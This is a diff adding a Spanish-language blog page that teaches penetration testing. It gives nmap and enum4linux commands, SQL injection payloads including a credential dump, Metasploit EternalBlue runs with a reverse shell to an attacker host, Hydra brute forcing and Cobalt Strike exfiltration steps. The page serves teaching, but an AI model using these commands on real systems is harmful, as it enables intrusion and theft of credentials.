@@ -1,0 +1,706 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Skye Journey</title>
+<link rel="icon" type="image/x-icon" href="../../../assets/buttons-icons/favicon.png">
+<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+<link rel="stylesheet" href="../..//blogs/posts/music-player-personal.css">
+<link rel="stylesheet" href="../../../nav bar.css">
+<link rel="stylesheet" href="blogs.css">
+<link href="https://fonts.googleapis.com/css2?family=Anton&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div id="preloader"></div>
+
+    <div class="container">
+        <aside class="blog-sidebar">
+            <h3>Index</h3>
+            <ul>
+                <li><a href="#enumeracion">Enumeración</a></li>
+                <li><a href="#conceptos-clave-enumeracion">Conceptos Clave en Enumeración</a></li>
+                <li><a href="#tecnicas-comunes-enumeracion">Técnicas Comunes de Enumeración</a></li>
+                <li><a href="#herramientas-enumeracion">Herramientas de Enumeración</a></li>
+                <li><a href="#explotacion">Explotación</a></li>
+                <li><a href="#conceptos-clave-explotacion">Conceptos Clave en Explotación</a></li>
+                <li><a href="#tecnicas-comunes-explotacion">Técnicas Comunes de Explotación</a></li>
+                <li><a href="#herramientas-explotacion">Herramientas de Explotación</a></li>
+                <li><a href="#post-explotacion">Post Explotación</a></li>
+                <li><a href="#conceptos-clave-post-explotacion">Conceptos Clave en Post Explotación</a></li>
+                <li><a href="#herramientas-post-explotacion">Herramientas de Post Explotación</a></li>
+                <li><a href="#conclusion">Conclusión :3</a></li>
+            </ul>
+        </aside>
+        
+        <main class="content">
+            <div class="banner">
+                <img src="../blogs-images/hacking-how-to.png" class="banner-image">
+                <center>
+                <h1 class="banner-title">¿Cómo hacer pentesting?</h1>
+                </center>
+            </div>
+            
+            <h1>Cómo Hacer Pentesting: Una Guía Completa de Comandos para Pruebas de Penetración</h1>
+            
+            <p>Las pruebas de penetración, comúnmente conocidas como pentesting, son una práctica crítica en ciberseguridad que implica simular ataques a una red, sistema o aplicación para identificar vulnerabilidades antes de que actores maliciosos puedan explotarlas. Esta guía proporciona una mirada en profundidad a comandos y herramientas esenciales de pentesting, ofreciendo explicaciones técnicas detalladas y ejemplos prácticos.</p>
+            
+            <h2 id="enumeracion">Enumeración</h2>
+            <p>La enumeración es una fase crucial en las pruebas de penetración que implica recopilar activamente información detallada sobre un sistema, red o aplicación objetivo. El objetivo principal de la enumeración es identificar y catalogar recursos, servicios, usuarios y configuraciones que pueden ser vulnerables a la explotación.</p>
+            
+            <h2 id="conceptos-clave-enumeracion">Conceptos Clave en Enumeración</h2>
+            <p>Descubrimiento de Hosts: Los enumeradores comienzan identificando hosts activos dentro de un rango de red utilizando herramientas como ping, escaneos ARP o técnicas más avanzadas como escaneos TCP ACK.</p>
+            <p>Escaneo de Puertos: Una vez que se identifican los hosts activos, se utilizan técnicas de escaneo de puertos como escaneos TCP SYN, escaneos TCP Connect o escaneos UDP para determinar qué puertos en los hosts objetivo están abiertos, cerrados o filtrados.</p>
+            <p>Identificación de Servicios: Los enumeradores sondean puertos abiertos para identificar servicios en ejecución y sus versiones. Esta información es crítica para comprender las vulnerabilidades potenciales asociadas con versiones específicas de servicios.</p>
+            <p>Enumeración de Usuarios: La enumeración de usuarios implica identificar nombres de usuario válidos en sistemas objetivo. Las técnicas van desde fuerza bruta en formularios de inicio de sesión hasta consultar servicios de directorio como LDAP o Windows Active Directory.</p>
+            <p>Enumeración de Red: La enumeración de dispositivos y configuraciones de red implica mapear la topología de red, identificar routers, switches y sus configuraciones, lo que puede revelar posibles puntos de entrada o puntos de pivote dentro de la red.</p>
+            
+            <h2 id="tecnicas-comunes-enumeracion">Técnicas Comunes de Enumeración</h2>
+            <p>Nmap: Nmap (Network Mapper) es una herramienta versátil utilizada para descubrimiento de redes y auditoría de seguridad. Puede realizar varios tipos de escaneos, incluyendo descubrimiento de hosts, escaneo de puertos, detección de versiones de servicios y detección de sistemas operativos.</p>
+            <p>Enum4Linux: Específicamente diseñado para enumerar información de servicios Windows y SMB, Enum4Linux puede recopilar detalles sobre usuarios, grupos, recursos compartidos y políticas, aprovechando las debilidades del protocolo SMB.</p>
+            <p>NBTScan: Utilizado para escanear servicios NetBIOS, NBTScan ayuda a enumerar nombres NetBIOS activos y sus direcciones IP asociadas, revelando detalles de redes Windows y vulnerabilidades potenciales.</p>
+            
+            <h2 id="herramientas-enumeracion">Herramientas de Enumeración</h2>
+            <h3>Nmap</h3>
+            <p>Nmap (Network Mapper) es una poderosa y versátil herramienta de código abierto utilizada para descubrimiento de redes y auditoría de seguridad. Puede identificar hosts activos en una red, puertos abiertos, servicios en ejecución e incluso el sistema operativo y versión de los dispositivos objetivo.</p>
+            
+            <h4>Parámetros de Nmap</h4>
+            <ul>
+                <li><strong>--min-rate &lt;rate&gt;</strong>: Establece el número mínimo de paquetes enviados por segundo para acelerar el escaneo.</li>
+                <li><strong>-n</strong>: Desactiva la resolución DNS para aumentar la velocidad de escaneo y evitar retrasos relacionados con DNS.</li>
+                <li><strong>--open</strong>: Muestra solo puertos abiertos, filtrando puertos cerrados y filtrados.</li>
+                <li><strong>-O</strong>: Habilita la detección del sistema operativo, intentando identificar el sistema operativo del objetivo.</li>
+                <li><strong>-oG &lt;file&gt;</strong>: Genera los resultados en formato Greppable para facilitar el análisis.</li>
+                <li><strong>-oN &lt;file&gt;</strong>: Genera los resultados en un formato legible para humanos.</li>
+                <li><strong>-oX &lt;file&gt;</strong>: Genera los resultados en formato XML para integración con otras herramientas.</li>
+                <li><strong>-Pn</strong>: Omite la fase de descubrimiento de hosts, asumiendo que el objetivo está activo.</li>
+                <li><strong>-p-</strong>: Escanea los 65,535 puertos TCP.</li>
+                <li><strong>-p &lt;ports&gt;</strong>: Especifica una lista de puertos a escanear.</li>
+                <li><strong>-sC</strong>: Ejecuta scripts Nmap predeterminados para vulnerabilidades comunes.</li>
+                <li><strong>-sS</strong>: Realiza un escaneo SYN sigiloso, que es menos probable que sea detectado por firewalls.</li>
+                <li><strong>-sU</strong>: Escanea puertos UDP, que a menudo se pasan por alto pero pueden ser críticos.</li>
+                <li><strong>-sV</strong>: Sondea puertos abiertos para determinar información de servicio/versión.</li>
+                <li><strong>-T4</strong>: Utiliza opciones de tiempo agresivas para acelerar el escaneo.</li>
+                <li><strong>--traceroute</strong>: Mapea la ruta que toman los paquetes para llegar al objetivo, útil para entender la topología de red.</li>
+                <li><strong>-v, -vv, -vvv</strong>: Aumenta la verbosidad para una salida más detallada.</li>
+            </ul>
+            
+            
+            <h4>Ejemplos de Nmap</h4>
+            <p>Escaneo Completo de Puertos: Realiza un escaneo TCP SYN rápido y exhaustivo en todos los puertos del objetivo 192.168.0.1, guardando los resultados en un formato Greppable.</p>
+            <div class="code-block">
+                sudo nmap -p- --open --min-rate 5000 -sS -n -Pn -vvv 192.168.0.1 -oG ports.txt
+            </div>
+            <p>Escaneo de Detección de Servicios: Escanea los puertos especificados (22, 80, 443) en el objetivo 192.168.0.1, detecta versiones de servicios y ejecuta scripts predeterminados para recopilar información adicional.</p>
+            <div class="code-block">
+                nmap -p22,80,443 -sV -sC -n -Pn 192.168.0.1 -oG services.txt
+            </div>
+            
+            <h3>Enum4Linux</h3>
+            <p>Enum4Linux es una herramienta para enumerar información de servicios Windows y SMB (Server Message Block). Se utiliza para recopilar detalles sobre usuarios, grupos, recursos compartidos y políticas en un entorno Windows.</p>
+            
+            <h4>Parámetros de Enum4Linux</h4>
+            <ul>
+                <li><strong>-a</strong>: Realiza una enumeración completa utilizando todas las opciones disponibles.</li>
+                <li><strong>-G</strong>: Enumera grupos en el objetivo.</li>
+                <li><strong>-M</strong>: Enumera máquinas (cuentas de ordenador) en el objetivo.</li>
+                <li><strong>-P</strong>: Enumera políticas de contraseñas, proporcionando información sobre configuraciones de seguridad.</li>
+                <li><strong>-S</strong>: Enumera recursos compartidos disponibles en el objetivo.</li>
+                <li><strong>-U</strong>: Enumera usuarios en el objetivo, lo que puede ayudar a identificar cuentas potenciales para atacar.</li>
+                <li><strong>-d</strong>: Proporciona información detallada, aumentando la verbosidad.</li>
+                <li><strong>-p &lt;password&gt;</strong>: Especifica una contraseña para usar en la autenticación.</li>
+                <li><strong>-u &lt;username&gt;</strong>: Especifica un nombre de usuario para usar en la autenticación.</li>
+            </ul>
+            
+            
+            <h4>Ejemplos de Enum4Linux</h4>
+            <p>Enumeración Completa: Realiza una enumeración completa del objetivo, recopilando información sobre usuarios, grupos, recursos compartidos, máquinas y políticas.</p>
+            <div class="code-block">
+                enum4linux -a <target>
+            </div>
+            
+            <h3>NBTScan</h3>
+            <p>NBTScan es una herramienta de línea de comandos para escanear servicios NetBIOS en una red. NetBIOS (Network Basic Input/Output System) permite que aplicaciones en diferentes ordenadores se comuniquen dentro de una red local.</p>
+            
+            <h4>Parámetros de NBTScan</h4>
+            <ul>
+                <li><strong>-v</strong>: Habilita el modo verboso para proporcionar una salida más detallada.</li>
+                <li><strong>-d</strong>: Vuelca el contenido de los paquetes NetBIOS.</li>
+                <li><strong>-e</strong>: Formatea la salida en formato <code>/etc/hosts</code>, haciéndola útil para añadir a archivos hosts.</li>
+                <li><strong>-l</strong>: Formatea la salida en formato lmhosts.</li>
+                <li><strong>-t &lt;time&gt;</strong>: Establece el tiempo máximo de espera para respuestas, controlando la duración del escaneo.</li>
+                <li><strong>-b &lt;bandwidth&gt;</strong>: Limita el ancho de banda utilizado durante el escaneo.</li>
+                <li><strong>-s &lt;separator&gt;</strong>: Formatea la salida para facilitar el scripting y análisis.</li>
+                <li><strong>-m &lt;retransmits&gt;</strong>: Establece el número de retransmisiones para confiabilidad.</li>
+            </ul>
+            
+            
+            <h4>Ejemplos de NBTScan</h4>
+            <p>Escaneo de Objetivo Único: Escanea una sola dirección IP, proporcionando información sobre nombres NetBIOS y servicios.</p>
+            <div class="code-block">
+                nbtscan 192.168.0.1
+            </div>
+            <p>Escaneo de Red: Escanea una subred completa, identificando todos los dispositivos con servicios NetBIOS activos.</p>
+            <div class="code-block">
+                nbtscan 192.168.0.1/24
+            </div>
+            <p>Escaneo desde Archivo: Escanea una lista de objetivos proporcionada en un archivo, útil para enumeración a gran escala.</p>
+            <div class="code-block">
+                nbtscan -f <file>
+            </div>
+            
+            <h3>Searchsploit</h3>
+            <p>Searchsploit es una interfaz de línea de comandos para buscar y recuperar exploits de la base de datos Exploit-DB, un repositorio de vulnerabilidades y exploits conocidos.</p>
+            
+            <h4>Parámetros de Searchsploit</h4>
+            <p>Opciones de Búsqueda:</p>
+            <ul>
+                <li><strong>-c</strong>: Búsqueda sensible a mayúsculas y minúsculas.</li>
+                <li><strong>-e</strong>: Búsqueda de término exacto.</li>
+                <li><strong>-t</strong>: Buscar solo por título.</li>
+                <li><strong>--cve &lt;CVE-ID&gt;</strong>: Buscar por identificador CVE.</li>
+            </ul>
+            
+            <p>Opciones de Salida:</p>
+            
+            <ul>
+                <li><strong>-j</strong>: Salida en formato JSON.</li>
+                <li><strong>-o</strong>: Permite que los títulos desborden columnas.</li>
+                <li><strong>-p</strong>: Muestra la ruta completa a los archivos de exploit.</li>
+                <li><strong>-v</strong>: Modo verboso.</li>
+                <li><strong>-w</strong>: Muestra URLs a exploit-db.com.</li>
+                <li><strong>--disable-colour</strong>: Desactiva la salida coloreada para facilitar la lectura o scripting.</li>
+            </ul>
+            
+            <p>Automatización:</p>
+            
+            <ul>
+                <li><strong>--nmap &lt;file.xml&gt;</strong>: Analiza la salida XML de Nmap para búsqueda automatizada de exploits.</li>
+            </ul>
+            
+            
+            <h3>Inyección SQL</h3>
+            <p>La inyección SQL es una técnica utilizada para explotar vulnerabilidades en la capa de base de datos de una aplicación inyectando código SQL malicioso. Aquí hay algunos ejemplos básicos de payload:</p>
+            <p>Bypass de Autenticación: Este payload puede omitir la autenticación de inicio de sesión explotando consultas SQL mal implementadas.</p>
+            <div class="code-block">
+                ' OR '1'='1' --
+            </div>
+            <p>Inyección SQL basada en UNION: Este payload utiliza el operador SQL UNION para combinar los resultados de dos o más sentencias select en un único resultado.</p>
+            <div class="code-block">
+                ' UNION SELECT null, table_name FROM information_schema.tables --
+            </div>
+            <p>Inyección SQL basada en Error: Este payload fuerza a la base de datos a generar un mensaje de error, que puede revelar información valiosa sobre la estructura de la base de datos.</p>
+            <div class="code-block">
+                ' AND 1=CONVERT(int, (SELECT @@version)) --
+            </div>
+            <p>Inyección SQL Ciega basada en Tiempo: Este payload utiliza funciones de base de datos para causar un retraso, que puede indicar si una condición es verdadera o falsa, útil en ataques de inyección SQL ciega.</p>
+            <div class="code-block">
+                ' OR IF(1=1, SLEEP(5), 0) --
+            </div>
+            <p>Inyección SQL Ciega basada en Booleanos: Este payload explota condiciones verdaderas o falsas para inferir información sobre la base de datos.</p>
+            <div class="code-block">
+                ' AND 1=1 --
+                ' AND 1=2 --
+            </div>
+            <p>Extracción de Versión de Base de Datos: Este payload recupera la versión de la base de datos.</p>
+            <div class="code-block">
+                ' UNION SELECT @@version, null --
+            </div>
+            <p>Recuperación de Nombres de Tablas: Este payload extrae los nombres de todas las tablas en la base de datos.</p>
+            <div class="code-block">
+                ' UNION SELECT table_name, null FROM information_schema.tables --
+            </div>
+            <p>Recuperación de Nombres de Columnas: Este payload extrae los nombres de columnas de una tabla específica.</p>
+            <div class="code-block">
+                ' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users' --
+            </div>
+            <p>Volcado de Credenciales de Usuario: Este payload recupera nombres de usuario y contraseñas de una tabla llamada users.</p>
+            <div class="code-block">
+                ' UNION SELECT username, password FROM users --
+            </div>
+            <p>Comentar el Resto de la Consulta: Este payload comenta el resto de la consulta SQL, lo que puede ser útil en varios escenarios de inyección.</p>
+            <div class="code-block">
+                ' OR '1'='1'/* 
+            </div>
+            
+            <h4>Ejemplos de Searchsploit</h4>
+            <p>Búsqueda Básica de Vulnerabilidad: Busca exploits locales relacionados con "afd" en sistemas Windows.</p>
+            <div class="code-block">
+                searchsploit afd windows local
+            </div>
+            <p>Búsqueda Específica de Título: Busca exploits relacionados con Oracle en Windows, centrándose en títulos.</p>
+            <div class="code-block">
+                searchsploit -t oracle windows
+            </div>
+            <p>Búsqueda Específica de Puerto: Busca exploits dirigidos a un puerto específico (39446).</p>
+            <div class="code-block">
+                searchsploit -p 39446
+            </div>
+            <p>Búsqueda de CVE: Busca exploits relacionados con la vulnerabilidad CVE-2021-4428.</p>
+            <div class="code-block">
+                searchsploit --cve 2021-4428
+            </div>
+            
+            <h2 id="explotacion">Explotación</h2>
+            <p>La explotación es la fase en el ciclo de vida de las pruebas de penetración donde el tester intenta activamente explotar vulnerabilidades identificadas durante las fases de enumeración y escaneo. El objetivo de la explotación es obtener acceso no autorizado a un sistema, elevar privilegios o ejecutar código arbitrario. Este paso implica utilizar diversas técnicas y herramientas para aprovechar debilidades en software, hardware o configuraciones de red.</p>
+            
+            <h2 id="conceptos-clave-explotacion">Conceptos Clave en Explotación</h2>
+            <p>Identificación de Vulnerabilidades: El paso inicial implica identificar vulnerabilidades específicas que pueden ser explotadas. Esto puede hacerse utilizando herramientas automatizadas o técnicas manuales. Las vulnerabilidades pueden incluir software sin parches, configuraciones incorrectas, contraseñas débiles o fallas inherentes en el diseño del sistema.</p>
+            <p>Entrega de Payload: Una vez que se identifica una vulnerabilidad, el siguiente paso es entregar un payload al sistema objetivo. Un payload es un fragmento de código que realiza la acción deseada, como abrir una puerta trasera, capturar credenciales o lanzar un shell de comandos. Los métodos comunes para la entrega de payloads incluyen desbordamientos de buffer, inyecciones SQL y ataques de phishing.</p>
+            <p>Ejecución y Control: Después de entregar el payload, el siguiente paso es ejecutarlo en el sistema objetivo. La ejecución exitosa permite al tester obtener control sobre el sistema. Este control puede ser temporal o persistente, dependiendo del tipo de payload y los objetivos del tester.</p>
+            <p>Post-Explotación: Esta fase implica mantener el acceso, escalar privilegios y moverse lateralmente dentro de la red. También incluye la exfiltración de datos, donde se extrae información sensible del sistema comprometido.</p>
+            
+            <h2 id="tecnicas-comunes-explotacion">Técnicas Comunes de Explotación</h2>
+            <p>Desbordamiento de Buffer: Esta técnica implica desbordar un buffer (un área de almacenamiento temporal de datos) con más datos de los que puede manejar, lo que puede sobrescribir la memoria adyacente y permitir la ejecución de código arbitrario. Los desbordamientos de buffer pueden ocurrir tanto en la memoria de pila como de montón.</p>
+            <p>Inyección SQL: Esta técnica implica inyectar código SQL malicioso en los campos de entrada de una aplicación, explotando vulnerabilidades en la capa de base de datos de la aplicación. Puede usarse para bypasear autenticación, recuperar o modificar contenido de la base de datos.</p>
+            <p>Cross-Site Scripting (XSS): Los ataques XSS implican inyectar scripts maliciosos en páginas web visualizadas por otros usuarios. Estos scripts pueden robar cookies de sesión, redirigir usuarios a sitios maliciosos o realizar acciones en nombre del usuario.</p>
+            <p>Phishing: Los ataques de phishing engañan a los usuarios para que proporcionen información sensible, como credenciales de inicio de sesión o información financiera, haciéndose pasar por entidades legítimas. Estos ataques a menudo se realizan a través de correo electrónico o sitios web fraudulentos.</p>
+            
+            <h2 id="herramientas-explotacion">Herramientas de Explotación</h2>
+            <h3>Metasploit Framework</h3>
+            <p>Metasploit es un framework de explotación ampliamente utilizado que proporciona un conjunto completo de herramientas para desarrollar, probar y ejecutar exploits. Incluye una vasta base de datos de vulnerabilidades conocidas y exploits preconstruidos.</p>
+            
+            <h4>Ejemplos de Metasploit</h4>
+            <p>Lanzamiento de un exploit simple: Utiliza Metasploit para explotar la vulnerabilidad MS08-067 en Windows SMB, configurando un payload TCP reverso para obtener una sesión meterpreter en el objetivo.</p>
+            <div class="code-block">
+                msfconsole
+                use exploit/windows/smb/ms08_067_netapi
+                set RHOST <target_ip>
+                set PAYLOAD windows/meterpreter/reverse_tcp
+                set LHOST <your_ip>
+                run
+            </div>
+            <p>Explotación de una Vulnerabilidad de Windows SMB: Utiliza el exploit EternalBlue (ms17_010_eternalblue) para atacar una máquina Windows a través de SMB, estableciendo una sesión Meterpreter.</p>
+            <div class="code-block">
+                msfconsole
+                use exploit/windows/smb/ms17_010_eternalblue
+                set RHOSTS <target_ip>
+                set PAYLOAD windows/x64/meterpreter/reverse_tcp
+                set LHOST <your_ip>
+                run
+            </div>
+            
+            <h3>SQLmap</h3>
+            <p>SQLmap es una herramienta automatizada para detectar y explotar vulnerabilidades de inyección SQL en aplicaciones web. Puede extraer información de la base de datos, ejecutar comandos SQL e incluso proporcionar un shell de comandos.</p>
+            
+            <h4>Ejemplos de SQLmap</h4>
+            <p>Explotación de una vulnerabilidad de inyección SQL: Utiliza SQLmap para explotar automáticamente una vulnerabilidad de inyección SQL en una aplicación web, recuperando y volcando el contenido de la base de datos.</p>
+            <div class="code-block">
+                sqlmap -u "http://example.com/index.php?id=1" --batch --dump
+            </div>
+            
+            <h3>BeEF</h3>
+            <p>BeEF (Browser Exploitation Framework): BeEF se centra en explotar vulnerabilidades en navegadores web. Permite a los testers controlar navegadores comprometidos y realizar diversas acciones, como robar credenciales o capturar pulsaciones de teclas.</p>
+            
+            <h3>Hydra</h3>
+            <p>Hydra es una herramienta de crackeo de contraseñas que soporta numerosos protocolos, incluyendo FTP, HTTP, SMB y más. Realiza ataques de fuerza bruta para adivinar credenciales de inicio de sesión.</p>
+            
+            <h4>Ejemplos de Hydra</h4>
+            <p>Fuerza bruta contra servicio FTP: Intenta forzar por fuerza bruta las credenciales de inicio de sesión FTP utilizando una lista de contraseñas de passwords.txt.</p>
+            <div class="code-block">
+                hydra -l <username> -P <passwords.txt> ftp://<target_ip>
+            </div>
+            
+            <h2 id="post-explotacion">Post Explotación</h2>
+            <p>La post explotación es crucial para que los testers de penetración demuestren completamente el impacto de las vulnerabilidades descubiertas durante las pruebas. Simula comportamientos de atacantes del mundo real y ayuda a las organizaciones a comprender su exposición a amenazas cibernéticas sofisticadas. Al realizar actividades exhaustivas de post-explotación, los testers proporcionan información accionable para mejorar las defensas de seguridad y mitigar riesgos de manera efectiva.</p>
+            
+            <h2 id="conceptos-clave-post-explotacion">Conceptos Clave en Post Explotación</h2>
+            <p>Mantener Acceso: Asegurar acceso persistente al sistema o red comprometida.</p>
+            <p>Puertas Traseras: Instalar puertas traseras persistentes para mantener el acceso.</p>
+            <p>Tunneling: Configurar túneles para comunicarse de forma segura con el sistema comprometido.</p>
+            <p>Escalada de Privilegios: Intentar elevar privilegios en el sistema comprometido para obtener acceso de nivel superior, potencialmente alcanzando privilegios administrativos o de root.</p>
+            <p>Exfiltración de Datos: Extraer datos sensibles como contraseñas, credenciales, información financiera o propiedad intelectual de sistemas comprometidos.</p>
+            <p>Transferencia de Archivos: Usar herramientas como scp o ftp para transferir datos fuera de la red.</p>
+            <p>Esteganografía: Ocultar datos dentro de imágenes u otros formatos de archivo para evadir la detección.</p>
+            <p>Movimiento Lateral: Moverse lateralmente a través de la red para acceder a otros sistemas o dispositivos, explorando objetivos adicionales para explotación.</p>
+            <p>Pass-the-Hash: Usar credenciales hasheadas robadas para autenticarse en otros sistemas.</p>
+            <p>Pivoting: Usar el sistema comprometido para lanzar ataques a otros sistemas dentro de la red.</p>
+            <p>Cubrir Rastros: Borrar evidencia del ataque.</p>
+            <p>Manipulación de Logs: Alterar o eliminar logs para ocultar evidencia del ataque.</p>
+            <p>Rootkits: Instalar rootkits para mantener control sigiloso sobre el sistema.</p>
+            
+            <h2 id="herramientas-post-explotacion">Herramientas de Post Explotación</h2>
+            <h3>PowerShell Empire</h3>
+            <p>Un framework de post-explotación que utiliza PowerShell para entornos Windows. Incluye módulos para mantener acceso, ejecutar comandos y exfiltrar datos.</p>
+            
+            <h4>Ejemplos de PowerShell Empire</h4>
+            <p>Escalada de Privilegios con PowerShell Empire: Comprueba vulnerabilidades comunes de escalada de privilegios en un sistema comprometido, con el objetivo de elevar privilegios y obtener mayor control.</p>
+            <div class="code-block">
+                empire
+                usemodule credentials/powerup/allchecks
+                execute
+            </div>
+            
+            <h3>Cobalt Strike</h3>
+            <p>Una herramienta comercial de pruebas de penetración que integra capacidades de post-explotación con infraestructura de comando y control. Facilita la emulación avanzada de amenazas y operaciones de equipo rojo.</p>
+            
+            <h4>Ejemplos con Cobalt Strike</h4>
+            <p>Exfiltración de Datos con Cobalt Strike: Permite la exfiltración de datos estableciendo un canal encubierto de comando y control para transmitir información sensible desde la red comprometida.</p>
+            <div class="code-block">
+                ./teamserver <your_IP> <password> <DNS_name>
+                ./cobaltstrike
+                exploit
+            </div>
+            
+            <h2 id="conclusion">Conclusión</h2>
+            <p>Las pruebas de penetración son un componente crítico de la ciberseguridad, ayudando a identificar y mitigar vulnerabilidades antes de que puedan ser explotadas por actores maliciosos. Herramientas como Nmap, Enum4Linux, NBTScan, Searchsploit y Hydra proporcionan capacidades invaluables para enumeración y explotación, mientras que comprender las técnicas de post-explotación asegura un enfoque integral para asegurar sistemas y redes.</p>
+            <p>Al dominar estas herramientas y técnicas, los profesionales de ciberseguridad pueden mejorar su capacidad para proteger contra amenazas potenciales y mejorar la postura de seguridad general de sus organizaciones.</p>
+            <p>Gracias por leer ^^</p>
+        </main>
+    </div>
+    
+    <div class="comments">
+        <main class="content">
+               <!-- begin wwww.htmlcommentbox.com -->
+ <div id="HCB_comment_box"><a href="http://www.htmlcommentbox.com">Widget</a> is loading comments...</div>
+ <script type="text/javascript" id="hcb"> /*<!--*/ if(!window.hcb_user){hcb_user={};} (function(){var s=document.createElement("script"), l=hcb_user.PAGE || (""+window.location).replace(/'/g,"%27"), h="https://www.htmlcommentbox.com";s.setAttribute("type","text/javascript");s.setAttribute("src", h+"/jread?page="+encodeURIComponent(l).replace("+","%2B")+"&mod=%241%24wq1rdBcg%2476gBfZFjo3Ne22wg7kCrl1"+"&opts=16798&num=10&ts=1742831563243");if (typeof s!="undefined") document.getElementsByTagName("head")[0].appendChild(s);})(); /*-->*/ </script>
+<!-- end www.htmlcommentbox.com -->
+</main>
+</div>
+
+
+	<!-- Music player lol-->
+    <div class="music-player">
+        <div class="highlight top-right"></div>
+        <div class="highlight bottom-left"></div>
+        
+        <button class="slide-toggle">
+            <i class="fas fa-chevron-down"></i>
+        </button>
+        
+        <div class="corner-tag">Now Playing</div>
+        
+        <div class="player-header">
+            <div class="visualizer">
+                <div class="visualizer-bar"></div>
+                <div class="visualizer-bar"></div>
+                <div class="visualizer-bar"></div>
+                <div class="visualizer-bar"></div>
+                <div class="visualizer-bar"></div>
+                <div class="visualizer-bar"></div>
+                <div class="visualizer-bar"></div>
+                <div class="visualizer-bar"></div>
+            </div>
+        </div>
+        
+        <div class="content">
+            <div class="album-art">
+                <img src="../../../assets/sound-effects/rings.svg" alt="Album Art">
+            </div>
+            
+            <div class="song-info">
+                <h3 class="song-title">Current Song</h3>
+            </div>
+            
+            <div class="progress-container">
+                <div class="current-time">0:00</div>
+                <div class="progress-bar">
+                    <div class="progress"></div>
+                </div>
+                <div class="duration">0:00</div>
+            </div>
+            
+            <div class="controls">
+                <button class="control-btn" id="prev">
+                    <i class="fas fa-backward"></i>
+                </button>
+                <button class="control-btn" id="play">
+                    <i class="fas fa-play"></i>
+                </button>
+                <button class="control-btn" id="next">
+                    <i class="fas fa-forward"></i>
+                </button>
+            </div>
+        </div>
+    </div>
+
+<!---End of the music player :D-->
+
+  			  <!--Nav bar-->
+                <div id="nav2-wrapper">
+                    <div id="nav2-custom-sidebar" class="hidden">
+                      <h2>Filesystem</h2>
+                      <ul>
+                      <li><a href="../../../home/index.html"><img src="../../../assets/nav-bar/home.png" alt="Home Icon">Home</a></li>
+                      <li><a href="#"><img src="../../../assets/nav-bar/about.png" alt="about Icon">About</a></li>
+                      <li><a href="../../../filesystem/social/index.html"><img src="../../../assets/nav-bar/social.png" alt="diary Icon">Social</a></li>
+                      <li><a href="../../../filesystem/support/index.html"><img src="../../../assets/nav-bar/support.png" alt="music Icon">Support</a></li>
+                      <li><a href="../../../filesystem/tos/index.html"><img src="../../../assets/nav-bar/rules.png" alt="games Icon">Tos</a></li>
+                      <li><a href="#"><img src="../../../assets/nav-bar/tools.png" alt="friends Icon">Tools</a></li>
+                      <li><a href="#"><img src="../../../assets/nav-bar/blog.png" alt="guestbook Icon">Blog <img src="../../../assets/buttons-icons/Phone App_Navigation.png" alt="new symbol"></a></li>
+                      <li><a href="#"><img src="../../../assets/nav-bar/resources.png" alt="faq Icon">Resources</a></li>
+                      <li><a href="#"><img src="../../../assets/nav-bar/software.png" alt="Chat Icon">Software</a></li>
+                      <li><a href="../../../filesystem/credits/index.html"><img src="../../../assets/nav-bar/credits.png" alt="archives Icon">Credits</a></li>
+                      <li><a href="https://trello.com/b/bosL3mrV/skye-workstation-queue"><img src="../../../assets/nav-bar/workstation.png" alt="kitty Icon">Workstation</a></li>
+                        <li><a href="#"><img src="../../../assets/nav-bar/sitemap.png" alt="kitty Icon">Sitemap</a></li>
+                      </ul>
+                      </div>
+                      <div class="nav2-blur-overlay" onclick="closeNav2Sidebar()"></div>
+                      <button id="nav2-sidebar-toggle"></button>
+                    </div>
+
+    <!-- Overlay-->
+    <div class="starfall-container">
+        <div class="starfield" id="starfield"></div>
+        </div>
+        <style>
+
+            /* Star Particles */
+            .stars {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: transparent;
+            pointer-events: none;
+            overflow: hidden;
+            z-index: -1;
+            }
+            
+            .star {
+            position: absolute;
+            width: 2px;
+            height: 2px;
+            background: #fff;
+            border-radius: 50%;
+            animation: move-stars 10s linear infinite;
+            opacity: 0.8;
+            }
+            
+            @keyframes move-stars {
+            0% {
+            transform: translateY(100vh);
+            opacity: 0.2;
+            }
+            100% {
+            transform: translateY(-10vh);
+            opacity: 1;
+            }
+            }
+            </style>
+        
+            <div class="stars"></div>
+            
+            <script>
+            // Generate stars dynamically
+            const starsContainer = document.querySelector('.stars');
+            const starCount = 500; 
+            
+            for (let i = 0; i < starCount; i++) {
+            const star = document.createElement('div');
+            star.classList.add('star');
+            star.style.left = Math.random() * 100 + 'vw';
+            star.style.top = Math.random() * 100 + 'vh';
+            star.style.animationDelay = Math.random() * 10 + 's';
+            star.style.animationDuration = 5 + Math.random() * 5 + 's';
+            starsContainer.appendChild(star);
+            }
+            </script>
+<style>
+.starfall-container {
+position: fixed;
+top: 0;
+left: 0;
+width: 100%;
+height: 100vh;
+background: transparent;
+overflow: hidden;
+display: flex;
+font-family: 'Anton', sans-serif;
+justify-content: center;
+align-items: center;
+margin: 0;
+z-index: -1;
+}
+
+.starfall-container .starfield {
+position: relative;
+width: 100%;
+height: 100%;
+transform: rotateZ(45deg);
+}
+
+.starfall-container .falling-star {
+position: absolute;
+height: 2px;
+background: linear-gradient(-45deg, rgba(255, 255, 255, 1), rgba(255, 255, 255, 0));
+border-radius: 999px;
+filter: drop-shadow(0 0 6px rgba(255, 255, 255, 0.7));
+animation:
+star-tail 3000ms ease-in-out infinite,
+star-falling 3000ms ease-in-out infinite;
+}
+
+.starfall-container .falling-star::before,
+.starfall-container .falling-star::after {
+content: '';
+position: absolute;
+top: calc(50% - 1px);
+right: 0;
+height: 2px;
+background: linear-gradient(-45deg, rgba(255, 255, 255, 0), rgba(255, 255, 255, 1), rgba(255, 255, 255, 0));
+border-radius: 100%;
+animation: star-glow 3000ms ease-in-out infinite;
+}
+
+.starfall-container .falling-star::before {
+transform: translateX(50%) rotateZ(45deg);
+}
+
+.starfall-container .falling-star::after {
+transform: translateX(50%) rotateZ(-45deg);
+}
+
+@keyframes star-tail {
+0% { width: 0; }
+30% { width: 100px; }
+100% { width: 0; }
+}
+
+@keyframes star-glow {
+0% { width: 0; }
+50% { width: 30px; }
+100% { width: 0; }
+}
+
+@keyframes star-falling {
+0% { transform: translateX(0); }
